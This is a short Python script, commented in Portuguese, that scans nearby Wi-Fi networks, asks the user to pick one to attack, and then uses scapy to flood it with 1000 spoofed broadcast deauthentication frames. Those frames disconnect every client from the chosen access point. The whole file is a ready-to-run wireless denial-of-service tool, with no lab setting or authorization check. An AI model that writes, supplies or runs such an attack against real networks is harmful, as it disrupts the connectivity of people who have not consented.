import os
from wifi import Cell
from scapy.all import sendp, RadioTap, Dot11, Dot11Deauth

# Função para escanear redes Wi-Fi e escolher uma rede
def scan_and_choose_network(interface):
    networks = Cell.all(interface)
    available_networks = []
    for network in networks:
        available_networks.append({"SSID": network.ssid, "BSSID": network.address, "Channel": network.channel, "Signal": network.signal})
        print(f"SSID: {network.ssid}, BSSID: {network.address}, Canal: {network.channel}, Sinal: {network.signal}")
    
    if not available_networks:
        print("Nenhuma rede encontrada.")
        return None

    ssid_choice = input("Digite o SSID da rede que deseja atacar: ")
    for network in available_networks:
        if network['SSID'] == ssid_choice:
            return network
    print("Rede não encontrada.")
    return None

# Função para ataque de Deautenticação
def deauth_attack(interface, bssid):
    pkt = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    print(f"Iniciando ataque de Deauth na rede {bssid}...")
    sendp(pkt, iface=interface, count=1000, inter=0.1, verbose=False)

if __name__ == "__main__":
    interface = "wlan0"
    chosen_network = scan_and_choose_network(interface)
    
    if chosen_network:
        deauth_attack(interface, chosen_network['BSSID'])
